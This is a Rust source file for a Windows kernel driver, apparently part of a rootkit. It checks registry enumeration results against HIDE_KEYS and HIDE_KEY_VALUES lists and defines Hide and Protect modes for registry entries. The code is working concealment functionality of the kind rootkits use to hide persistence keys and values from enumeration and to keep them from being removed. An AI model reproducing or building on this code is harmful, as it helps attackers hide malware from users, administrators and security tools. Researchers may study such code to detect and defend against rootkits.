#![allow(non_upper_case_globals)]

use {
    super::{Registry, HIDE_KEYS},
    crate::registry::HIDE_KEY_VALUES,
    core::{ffi::c_void, mem::size_of, slice::from_raw_parts},
    alloc::{format, string::String},
    wdk_sys::{
        *,
        ntddk::{ZwEnumerateKey, ZwEnumerateValueKey},
        _KEY_INFORMATION_CLASS::{KeyBasicInformation, KeyNameInformation},
        _KEY_VALUE_INFORMATION_CLASS::{
            KeyValueBasicInformation, KeyValueFullInformation, KeyValueFullInformationAlign64
        },
    },
};

/// Checks if the key is present.
///
/// # Parameters
/// 
/// - `info`: Pointer to the record operation information structure.
/// - `key`: Name of the key to be checked.
///
/// # Returns
/// 
/// - `bool`: Returns `true` if the key is found, otherwise `false`.
///
pub unsafe fn check_key(info: *mut REG_POST_OPERATION_INFORMATION, key: String) -> bool {
    let info_class = (*info).PreInformation as *mut REG_ENUMERATE_KEY_INFORMATION;
    match (*info_class).KeyInformationClass {
        KeyBasicInformation => {
            let basic_information = (*info_class).KeyInformation as *mut KEY_BASIC_INFORMATION;
            let name = from_raw_parts((*basic_information).Name.as_ptr(), ((*basic_information).NameLength / size_of::<u16>() as u32) as usize);
            
            let key = format!("{key}\\{}", String::from_utf16_lossy(name));
            if Registry::check_key(key.clone(), HIDE_KEYS.lock()) {
                return true
            }
        },
        KeyNameInformation => {
            let basic_information = (*info_class).KeyInformation as *mut KEY_NAME_INFORMATION;
            let name = from_raw_parts((*basic_information).Name.as_ptr(), ((*basic_information).NameLength / size_of::<u16>() as u32) as usize);

            let key = format!("{key}\\{}", String::from_utf16_lossy(name));
            if Registry::check_key(key.clone(), HIDE_KEYS.lock()) {
                return true
            }
        },
        _ => {}
    }

    return false
}

/// Checks if the key value is present.
///
/// # Parameters
/// - `info`: Pointer to the record operation information structure.
/// - `key`: Name of the key to be checked.
///
/// # Returns
/// - `bool`: Returns `true` if the value is found, otherwise `false`.
/// 
pub unsafe fn check_key_value(info: *mut REG_POST_OPERATION_INFORMATION, key: String) -> bool {
    let info_class = (*info).PreInformation as *const REG_ENUMERATE_VALUE_KEY_INFORMATION;
    match (*info_class).KeyValueInformationClass {
        KeyValueBasicInformation => {    
            let value = (*info_class).KeyValueInformation as *const KEY_VALUE_BASIC_INFORMATION;   
            let name = from_raw_parts((*value).Name.as_ptr(), ((*value).NameLength / size_of::<u16>() as u32) as usize);
            let value =  String::from_utf16_lossy(name);
            if Registry::check_target(key.clone(), value.clone(), HIDE_KEY_VALUES.lock()) {
                return true
            }
        },
        KeyValueFullInformationAlign64 => {
            let value = (*info_class).KeyValueInformation as *const KEY_VALUE_FULL_INFORMATION;
            let name = from_raw_parts((*value).Name.as_ptr(), ((*value).NameLength / size_of::<u16>() as u32) as usize);
            
            let value =  String::from_utf16_lossy(name);
            if Registry::check_target(key.clone(), value.clone(), HIDE_KEY_VALUES.lock()) {
                return true
            }
        
        },
        KeyValueFullInformation => {
            let value = (*info_class).KeyValueInformation as *const KEY_VALUE_FULL_INFORMATION;
            let name = from_raw_parts((*value).Name.as_ptr(), ((*value).NameLength / size_of::<u16>() as u32) as usize,);
            
            let value =  String::from_utf16_lossy(name);
            if Registry::check_target(key.clone(), value.clone(), HIDE_KEY_VALUES.lock()) {
                return true
            }
        }
        _ => {}
    }

    return false
}

/// Enumerate the target key.
///
/// # Parameters
/// - `key_handle`: Handle of the target key.
/// - `index`: Index to be listed.
/// - `buffer`: Buffer that will store the key.
/// - `buffer_size`: Buffer size.
/// - `key_value_information`: Defines the type of information to return about the target registry key.
/// - `result_length`: Return size value.
/// 
/// # Returns
/// - `Option<String>`: Returns `Some(String)` if the process lookup is successful, otherwise `None`.
/// 
pub unsafe fn enumerate_key(
    key_handle: HANDLE,
    index: u32,
    buffer: *mut u8,
    buffer_size: u32,
    key_information: KEY_INFORMATION_CLASS,
    result_length: &mut u32
) -> Option<String> {
    let status = ZwEnumerateKey(
        key_handle,
        index,
        key_information,
        buffer as *mut c_void,
        buffer_size,
        result_length
    );

    if status == STATUS_NO_MORE_ENTRIES {
        return None;
    }

    if !NT_SUCCESS(status) {
        log::error!("ZwEnumerateKey Failed With Status: {status}");
        return None;
    }

    match key_information {
        KeyBasicInformation => {
            let basic_information = &*(buffer as *const KEY_BASIC_INFORMATION);
            let name = from_raw_parts(
                (*basic_information).Name.as_ptr(),
                ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
            );

            Some(String::from_utf16_lossy(name))
        },
        KeyNameInformation => {
            let basic_information = &*(buffer as *const KEY_NAME_INFORMATION);
            let name = from_raw_parts(
                (*basic_information).Name.as_ptr(),
                ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
            );
            Some(String::from_utf16_lossy(name))
        },
        _ => {
            None
        }
    }

}

/// Enumerates values of the target key
///
/// # Parameters
/// - `key_handle`: Handle of the target key.
/// - `index`: Index to be listed.
/// - `buffer`: Buffer that will store the key values.
/// - `buffer_size`: Buffer size.
/// - `key_value_information`: Defines the type of information to be returned about the registry key value.
/// - `result_length`: Return size value.
/// 
/// # Returns
/// - `Option<String>`: Returns `Some(String)` if the process lookup is successful, otherwise `None`.
/// 
pub unsafe fn enumerate_value_key(
    key_handle: HANDLE,
    index: u32,
    buffer: *mut u8,
    buffer_size: u32,
    key_value_information: KEY_VALUE_INFORMATION_CLASS,
    result_length: &mut u32
) -> Option<String> {
    let status = ZwEnumerateValueKey(
        key_handle,
        index,
        key_value_information,
        buffer as *mut c_void,
        buffer_size,
        result_length
    );

    if status == STATUS_NO_MORE_ENTRIES {
        return None;
    }

    if !NT_SUCCESS(status) {
        log::error!("ZwEnumerateValueKey Failed With Status: {status}");
        return None;
    }

    match key_value_information {
        KeyValueBasicInformation => {
            let key_info = &*(buffer as *const KEY_VALUE_BASIC_INFORMATION);
            let key_name_utf16: &[u16] = from_raw_parts(
                key_info.Name.as_ptr(),
                (key_info.NameLength / size_of::<u16>() as u32) as usize,
            );
            Some(String::from_utf16_lossy(key_name_utf16))
        },
        KeyValueFullInformationAlign64 => {
            let key_info = &*(buffer as *const KEY_VALUE_FULL_INFORMATION);
            let key_name_utf16: &[u16] = from_raw_parts(
                key_info.Name.as_ptr(),
                (key_info.NameLength / size_of::<u16>() as u32) as usize,
            );
            Some(String::from_utf16_lossy(key_name_utf16))
        },
        KeyValueFullInformation => {
            let value_info = &*(buffer as *const KEY_VALUE_FULL_INFORMATION);
            let value_name_utf16: &[u16] = from_raw_parts(
                value_info.Name .as_ptr(),
                (value_info.NameLength / size_of::<u16>() as u32) as usize,
            );
            Some(String::from_utf16_lossy(value_name_utf16))
        },
        _ => {
            None
        }
    }
}

/// Trait for accessing the object in registry information.
pub trait RegistryInfo {
    ///
    /// 
    /// 
    /// 
    fn get_object(&self) -> *mut c_void;
}

impl RegistryInfo for REG_DELETE_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_DELETE_VALUE_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_SET_VALUE_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_QUERY_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_POST_OPERATION_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

/// Enum represents the types of operations to be done with the Registry.
pub enum KeyListType{
    Hide,
    Protect
}